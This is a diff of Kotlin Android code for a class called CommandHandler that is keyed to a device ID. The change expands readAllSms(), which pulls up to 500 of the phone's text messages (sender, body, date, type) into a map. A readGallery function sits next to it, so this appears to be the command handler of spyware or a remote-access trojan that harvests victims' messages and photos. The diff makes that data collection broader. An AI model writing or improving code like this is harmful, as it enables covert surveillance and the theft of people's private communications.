@@ -716,35 +716,43 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     private fun readAllSms(): Map<String, Any> {
-        val list = mutableListOf<Map<String, String>>()
-        try {
-            val cursor = ctx.contentResolver.query(
-                Uri.parse("content://sms/"),
-                null, null, null, "date DESC LIMIT 200"
-            )
-            cursor?.use {
-                while (it.moveToNext()) {
-                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
-                    val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
-                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
-                    val type = it.getInt(it.getColumnIndexOrThrow("type"))
-                    val typeStr = when (type) {
-                        1 -> "inbox"
-                        2 -> "sent"
-                        3 -> "draft"
-                        else -> "other"
-                    }
-                    list.add(mapOf(
-                        "app" to addr,
-                        "body" to body,
-                        "date" to date.toString(),
-                        "type" to typeStr
-                    ))
+    val list = mutableListOf<Map<String, String>>()
+    try {
+        val cursor = ctx.contentResolver.query(
+            Uri.parse("content://sms/"),
+            arrayOf("_id", "address", "body", "date", "type"),
+            null,
+            null,
+            "date DESC LIMIT 500"
+        )
+        cursor?.use {
+            while (it.moveToNext()) {
+                val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
+                val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
+                val date = it.getLong(it.getColumnIndexOrThrow("date"))
+                val type = it.getInt(it.getColumnIndexOrThrow("type"))
+                val typeStr = when (type) {
+                    1 -> "inbox"
+                    2 -> "sent"
+                    3 -> "draft"
+                    4 -> "outbox"
+                    5 -> "failed"
+                    6 -> "queued"
+                    else -> "other"
                 }
+                list.add(mapOf(
+                    "app" to addr,
+                    "body" to body,
+                    "date" to date.toString(),
+                    "type" to typeStr
+                ))
             }
-        } catch (_: Exception) {}
-        return mapOf("type" to "sms", "messages" to list)
+        }
+    } catch (e: Exception) {
+        android.util.Log.e("CommandHandler", "readAllSms error", e)
     }
+    return mapOf("type" to "sms", "messages" to list)
+}
 
     private fun readGallery(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
